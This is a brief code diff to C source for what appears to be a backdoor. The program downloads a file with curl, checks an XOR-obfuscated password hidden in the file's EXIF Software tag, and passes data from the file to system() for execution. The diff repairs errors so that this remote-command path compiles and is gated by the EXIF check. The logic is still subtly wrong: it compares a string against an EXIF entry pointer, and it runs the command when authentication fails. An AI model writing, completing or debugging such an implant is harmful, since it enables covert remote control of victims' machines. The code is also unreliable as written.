@@ -35,8 +35,8 @@ int authenticate(const char *filename)
 { 
 	ExifData *data; 
 	data = exif_data_new_from_file(filename); 
-	ExifEntry *entry = exif_content_get_entry(data->idf[EXIF_IDF_0], EXIF_TAG_SOFTWARE); 
-	char pw = strdup(PASSWORD); xor(pw); 
+	ExifEntry *entry = exif_content_get_entry(data->ifd[EXIF_IFD_0], EXIF_TAG_SOFTWARE); 
+	char *pw = strdup(PASSWORD); xor(pw); 
 	if (strcmp(pw, entry) != 0)
 	{ 
 		return 1; 
@@ -63,7 +63,7 @@ int main()
     curl_easy_perform(curl_handle);
     const char *data; 
     data = getcmd(filename);
-    if (getcmd(filename) == 1)
+    if (authenticate(filename) == 1)
     { 
 	system(data);
     } 
